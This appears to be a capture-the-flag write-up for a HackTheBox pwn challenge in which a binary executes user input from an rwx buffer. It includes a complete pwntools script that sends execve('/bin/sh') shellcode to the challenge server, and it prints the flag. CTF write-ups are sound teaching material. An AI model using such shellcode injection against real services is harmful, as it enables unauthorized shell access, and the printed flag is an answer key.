# Rice Field

## Information

- **Difficulty**: Very Easy
- **Category**: Pwn
- **Platform**: HackTheBox (Neurogrid CTF)
- **Date**: 2025-11-21
- **Points**: 925

## Challenge Description

Takashi, the fearless blade of the East, weary from countless battles, now seeks not war—but warmth. His body aches, his spirit hungers. Upon the road, he discovers a sacred haven: the legendary Rice Field Restaurant, known across the land for its peerless grains. But here, the rice is not served—it is earned. Guide Takashi as he prepares his own perfect bowl, to restore his strength and walk the path once more.

## Reconnaissance

### Initial Analysis

The challenge provides a binary `rice_field`. Running `checksec` reveals the following security protections:

```bash
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

Despite `NX` being enabled, the binary behavior suggests a shellcode execution vulnerability.

### Findings

Decompiling and analyzing the binary with `objdump` and running it locally:

1.  The binary presents a menu with options to "Collect Rice" and "Cook Rice".
2.  The `cook_rice` function allocates a memory region using `mmap` with `rwx` permissions (PROT_READ | PROT_WRITE | PROT_EXEC).
3.  It then reads user input directly into this executable memory region.
4.  Finally, it jumps to the start of the buffer, executing the input as code.

This is a classic shellcode injection scenario. The "Collect Rice" functionality appears to be a distraction or a simple game mechanic that doesn't prevent the exploit.

## Exploitation

### Vulnerability Analysis

The `cook_rice` function explicitly creates an executable buffer and executes user-supplied data. This bypasses the NX protection for that specific memory region.

### Exploit Development

We can construct a simple exploit using `pwntools`. The exploit steps are:
1.  Connect to the target.
2.  Navigate the menu to reach the "Cook Rice" option.
3.  Send x86-64 shellcode to execute `/bin/sh`.

The prompt uses wide characters (`＞`, `？`), which need to be handled correctly when interacting with the service.

```python
from pwn import *

# Set up the target
host = '154.57.164.66'
port = 30390
binary_path = './rice_field'

context.binary = binary_path
context.arch = 'amd64'

# Connect to the remote target
r = remote(host, port)

# Shellcode to execute /bin/sh
# 24 bytes
shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    xor rdx, rdx
    mov al, 59
    syscall
''')

# Pad shellcode to 26 bytes with NOPs
shellcode = shellcode.ljust(26, b'\x90')

log.info(f"Shellcode length: {len(shellcode)}")

# 1. Select "Collect Rice"
# The prompt uses a special character: ＞
r.recvuntil(b'\xef\xbc\x9e ')
r.sendline(b'1')

# 2. Enter amount "16"
# The prompt uses a special character: ？
r.recvuntil(b'\xef\xbc\x9f')
r.sendline(b'16')

# 3. Select "Cook Rice"
r.recvuntil(b'\xef\xbc\x9e ')
r.sendline(b'2')

# 4. Send shellcode
# The prompt uses a special character: ？
r.recvuntil(b'\xef\xbc\x9f')
r.send(shellcode)

# Interactive mode to use the shell
r.interactive()
```

### User Flag

```
HTB{~Gohan_to_flag_o_tanoshinde_ne~_9c7c79df5243a1f24c93581467946a39}
```
